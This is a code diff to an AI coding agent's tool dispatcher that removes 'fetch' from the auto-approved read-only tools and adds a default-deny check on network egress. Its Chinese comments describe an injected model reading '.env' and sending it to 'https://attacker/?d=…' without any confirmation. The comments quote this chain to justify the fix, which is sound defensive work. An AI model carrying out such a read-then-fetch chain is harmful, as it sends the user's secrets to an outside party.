@@ -7,10 +7,19 @@ import { runBash, buildChildEnv } from './bash.js';
 import { runGit } from './git.js';
 import { runFetch } from './fetch.js';
 import { listSkills, loadSkill } from '../skills.js';
+import { unconfiguredEgressVerdict } from '../net-guard.js';
 import { spawn } from 'node:child_process';
 
-// 只读工具集合的单一来源：permissions.js 引用此导出，新增只读工具时只需改这里
-export const READONLY_TOOLS = new Set(['read', 'glob', 'grep', 'ls', 'skill', 'git', 'fetch']);
+// 只读工具集合的单一来源：permissions.js 引用此导出，新增只读工具时只需改这里。
+//
+// v0.6.30（C3，报告四 H2 / 报告三 H-12）：**`fetch` 不再属于只读工具**。
+// 「只读」承诺的是"不写本地"，而 `fetch` 读的是网络、写的是**数据出门**——把它和 read 放在
+// 同一档，默认 ask 下就是一条零确认的外传通道（`read('.env')` + `fetch('https://attacker/?d=…')`
+// 全程不弹确认）。现在归入 `NET_TOOLS`：默认 ask 档**逐次确认**，readonly 档不再自动放行
+// （要放行请显式配 `config.net` 白名单，见下方 dispatch 的默认闸门与 docs/CONFIG.md）。
+export const READONLY_TOOLS = new Set(['read', 'glob', 'grep', 'ls', 'skill', 'git']);
+/** 出网类工具（C3）：读网络而不是本地资源，单独归类——不属于只读自动放行集合。 */
+export const NET_TOOLS = new Set(['fetch']);
 
 const READ_SCHEMA = {
   type: 'object',
@@ -648,8 +657,15 @@ export async function dispatch(/** @type {any} */ name, /** @type {any} */ args,
       return undo(args, toolCtx);
     case 'git':
       return runGit(args, toolCtx);
-    case 'fetch':
+    case 'fetch': {
+      // v0.6.30（C3②）：**net 未配置 → 默认拒绝出网**（fail-closed），并把原因说给模型/用户看。
+      // 不能只靠 safe-fetch 的闸门：未配置 config.net 时那个闸门根本不安装（既有不变量），
+      // 于是一个被注入的模型可以 read('.env') → fetch('https://attacker/?d=…') 全程零确认。
+      // 判定与文案的单一来源在 net-guard.js（unconfiguredEgressVerdict），这里只负责拒绝。
+      const egress = unconfiguredEgressVerdict(args?.url);
+      if (egress) return { ok: false, error: egress.message };
       return runFetch(args, toolCtx);
+    }
     default:
       return { ok: false, error: `未知工具：${name}` };
   }
